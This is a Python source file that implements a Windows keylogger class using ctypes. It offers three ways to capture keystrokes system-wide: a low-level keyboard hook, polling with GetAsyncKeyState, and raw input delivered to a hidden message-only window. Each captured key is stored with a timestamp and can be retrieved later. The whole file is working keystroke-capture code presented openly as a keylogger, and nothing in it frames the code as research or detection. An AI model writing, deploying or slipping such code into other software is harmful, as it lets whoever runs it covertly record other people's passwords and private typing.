import ctypes
from ctypes import wintypes
import threading
import time

# Win32 Constants
WH_KEYBOARD_LL = 13
WM_KEYDOWN = 0x0100
WM_SYSKEYDOWN = 0x0104
WM_INPUT = 0x00FF
RID_INPUT = 0x10000003
RIDEV_INPUTSINK = 0x00000100
HWND_MESSAGE = -3

# Types
HCURSOR = wintypes.HANDLE
HICON = wintypes.HANDLE
HBRUSH = wintypes.HANDLE
HOOKPROC = ctypes.WINFUNCTYPE(ctypes.c_int64, ctypes.c_int, wintypes.WPARAM, wintypes.LPARAM)
WNDPROC = ctypes.WINFUNCTYPE(ctypes.c_int64, wintypes.HWND, wintypes.UINT, wintypes.WPARAM, wintypes.LPARAM)

class KBDLLHOOKSTRUCT(ctypes.Structure):
    _fields_ = [
        ("vkCode", wintypes.DWORD),
        ("scanCode", wintypes.DWORD),
        ("flags", wintypes.DWORD),
        ("time", wintypes.DWORD),
        ("dwExtraInfo", ctypes.c_void_p)
    ]

class RAWINPUTHEADER(ctypes.Structure):
    _fields_ = [
        ("dwType", wintypes.DWORD),
        ("dwSize", wintypes.DWORD),
        ("hDevice", wintypes.HANDLE),
        ("wParam", wintypes.WPARAM)
    ]

class RAWKEYBOARD(ctypes.Structure):
    _fields_ = [
        ("MakeCode", wintypes.WORD),
        ("Flags", wintypes.WORD),
        ("Reserved", wintypes.WORD),
        ("VKey", wintypes.WORD),
        ("Message", wintypes.UINT),
        ("ExtraInformation", wintypes.ULONG)
    ]

class RAWINPUT_UNION(ctypes.Union):
    _fields_ = [("keyboard", RAWKEYBOARD)]

class RAWINPUT(ctypes.Structure):
    _fields_ = [
        ("header", RAWINPUTHEADER),
        ("data", RAWINPUT_UNION)
    ]

class RAWINPUTDEVICE(ctypes.Structure):
    _fields_ = [
        ("usUsagePage", wintypes.USHORT),
        ("usUsage", wintypes.USHORT),
        ("dwFlags", wintypes.DWORD),
        ("hwndTarget", wintypes.HWND)
    ]

class WNDCLASSEXW(ctypes.Structure):
    _fields_ = [
        ("cbSize", wintypes.UINT),
        ("style", wintypes.UINT),
        ("lpfnWndProc", WNDPROC),
        ("cbClsExtra", ctypes.c_int),
        ("cbWndExtra", ctypes.c_int),
        ("hInstance", wintypes.HINSTANCE),
        ("hIcon", HICON),
        ("hCursor", HCURSOR),
        ("hbrBackground", HBRUSH),
        ("lpszMenuName", wintypes.LPCWSTR),
        ("lpszClassName", wintypes.LPCWSTR),
        ("hIconSm", HICON)
    ]

class Win32Keylogger:
    def __init__(self):
        self.logs = []
        self.is_running = False
        self.method = None
        self.thread = None
        
        self.user32 = ctypes.windll.user32
        self.kernel32 = ctypes.windll.kernel32
        
        # Keep callbacks alive in memory to prevent GC garbage collection crashes
        self._hook_proc = HOOKPROC(self._hook_callback)
        self._wnd_proc = WNDPROC(self._raw_input_callback)
        self.h_hook = None
        self.hwnd = None

    def start(self, method):
        if self.is_running:
            self.stop()
            
        self.is_running = True
        self.method = method
        
        if method == "hook":
            self.thread = threading.Thread(target=self._run_hook, daemon=True)
        elif method == "polling":
            self.thread = threading.Thread(target=self._run_polling, daemon=True)
        elif method == "raw_input":
            self.thread = threading.Thread(target=self._run_raw_input, daemon=True)
        else:
            self.is_running = False
            raise ValueError(f"Unknown keylogging method: {method}")
            
        self.thread.start()

    def stop(self):
        self.is_running = False
        
        # Clean up hooks
        if self.h_hook:
            self.user32.UnhookWindowsHookEx(self.h_hook)
            self.h_hook = None
            
        # Destroy window if raw input active
        if self.hwnd:
            self.user32.DestroyWindow(self.hwnd)
            self.hwnd = None
            
        if self.thread:
            self.thread.join(timeout=1.0)
            self.thread = None
            
        self.method = None

    def get_logs(self):
        ret = list(self.logs)
        self.logs.clear()
        return ret

    def _translate_vk(self, vk):
        # Handle common special characters
        special = {
            0x08: "[BACKSPACE]",
            0x09: "[TAB]",
            0x0D: "[ENTER]\n",
            0x1B: "[ESC]",
            0x20: " ",
            0x25: "[LEFT]",
            0x26: "[UP]",
            0x27: "[RIGHT]",
            0x28: "[DOWN]",
            0x2E: "[DEL]",
            0x10: "[SHIFT]",
            0x11: "[CTRL]",
            0x12: "[ALT]",
            0x14: "[CAPS_LOCK]"
        }
        if vk in special:
            return special[vk]
            
        # Ask Windows to convert to Unicode
        state = (ctypes.c_byte * 256)()
        self.user32.GetKeyboardState(ctypes.byref(state))
        
        buf = ctypes.create_unicode_buffer(5)
        scan = self.user32.MapVirtualKeyW(vk, 0)
        res = self.user32.ToUnicode(vk, scan, ctypes.byref(state), buf, len(buf), 0)
        
        if res > 0:
            return buf.value
        elif 32 <= vk <= 126:
            return chr(vk)
        return ""

    # --- Hook Method ---
    def _run_hook(self):
        h_inst = self.kernel32.GetModuleHandleW(None)
        self.h_hook = self.user32.SetWindowsHookExW(WH_KEYBOARD_LL, self._hook_proc, h_inst, 0)
        if not self.h_hook:
            self.is_running = False
            return
            
        msg = wintypes.MSG()
        while self.is_running:
            # Non-blocking peek message
            r = self.user32.PeekMessageW(ctypes.byref(msg), 0, 0, 0, 1) # PM_REMOVE = 1
            if r > 0:
                self.user32.TranslateMessage(ctypes.byref(msg))
                self.user32.DispatchMessageW(ctypes.byref(msg))
            time.sleep(0.005)

    def _hook_callback(self, code, wparam, lparam):
        if code >= 0 and wparam in (WM_KEYDOWN, WM_SYSKEYDOWN):
            kbd = ctypes.cast(lparam, ctypes.POINTER(KBDLLHOOKSTRUCT)).contents
            char = self._translate_vk(kbd.vkCode)
            if char:
                self.logs.append({
                    "timestamp": time.strftime("%H:%M:%S"),
                    "key": char,
                    "code": kbd.vkCode
                })
        return self.user32.CallNextHookEx(self.h_hook, code, wparam, lparam)

    # --- Polling Method ---
    def _run_polling(self):
        last_state = [False] * 256
        while self.is_running:
            for vk in range(1, 256):
                # MSB (0x8000) indicates key down
                state = self.user32.GetAsyncKeyState(vk)
                is_down = bool(state & 0x8000)
                
                if is_down and not last_state[vk]:
                    char = self._translate_vk(vk)
                    if char:
                        self.logs.append({
                            "timestamp": time.strftime("%H:%M:%S"),
                            "key": char,
                            "code": vk
                        })
                last_state[vk] = is_down
            time.sleep(0.01) # 10ms poll

    # --- Raw Input Method ---
    def _run_raw_input(self):
        # Register a hidden Window Class
        class_name = u"RawInputListenerClass"
        h_inst = self.kernel32.GetModuleHandleW(None)
        
        wcex = WNDCLASSEXW()
        wcex.cbSize = ctypes.sizeof(WNDCLASSEXW)
        wcex.lpfnWndProc = self._wnd_proc
        wcex.hInstance = h_inst
        wcex.lpszClassName = class_name
        
        self.user32.RegisterClassExW(ctypes.byref(wcex))
        
        # Create Message window
        self.hwnd = self.user32.CreateWindowExW(
            0, class_name, u"RawInputWindow",
            0, 0, 0, 0, 0,
            HWND_MESSAGE, 0, h_inst, 0
        )
        
        if not self.hwnd:
            self.is_running = False
            return
            
        # Register Raw Input Device
        rid = RAWINPUTDEVICE()
        rid.usUsagePage = 1 # Generic Desktop
        rid.usUsage = 6     # Keyboard
        rid.dwFlags = RIDEV_INPUTSINK
        rid.hwndTarget = self.hwnd
        
        if not self.user32.RegisterRawInputDevices(ctypes.byref(rid), 1, ctypes.sizeof(RAWINPUTDEVICE)):
            self.is_running = False
            return
            
        # Message loop
        msg = wintypes.MSG()
        while self.is_running:
            r = self.user32.PeekMessageW(ctypes.byref(msg), 0, 0, 0, 1)
            if r > 0:
                self.user32.TranslateMessage(ctypes.byref(msg))
                self.user32.DispatchMessageW(ctypes.byref(msg))
            time.sleep(0.005)

    def _raw_input_callback(self, hwnd, msg, wparam, lparam):
        if msg == WM_INPUT:
            size = wintypes.DWORD()
            # Get buffer size
            self.user32.GetRawInputData(
                ctypes.c_void_p(lparam), RID_INPUT, None,
                ctypes.byref(size), ctypes.sizeof(RAWINPUTHEADER)
            )
            if size.value > 0:
                buf = ctypes.create_string_buffer(size.value)
                if self.user32.GetRawInputData(
                    ctypes.c_void_p(lparam), RID_INPUT, buf,
                    ctypes.byref(size), ctypes.sizeof(RAWINPUTHEADER)
                ) == size.value:
                    raw = ctypes.cast(buf, ctypes.POINTER(RAWINPUT)).contents
                    if raw.header.dwType == 1: # RIM_TYPEKEYBOARD = 1
                        kbd = raw.data.keyboard
                        # Flags LSB=0 means key down, LSB=1 means key up (BREAK)
                        is_down = not (kbd.Flags & 1)
                        if is_down:
                            char = self._translate_vk(kbd.VKey)
                            if char:
                                self.logs.append({
                                    "timestamp": time.strftime("%H:%M:%S"),
                                    "key": char,
                                    "code": kbd.VKey
                                })
        return self.user32.DefWindowProcW(hwnd, msg, wparam, lparam)
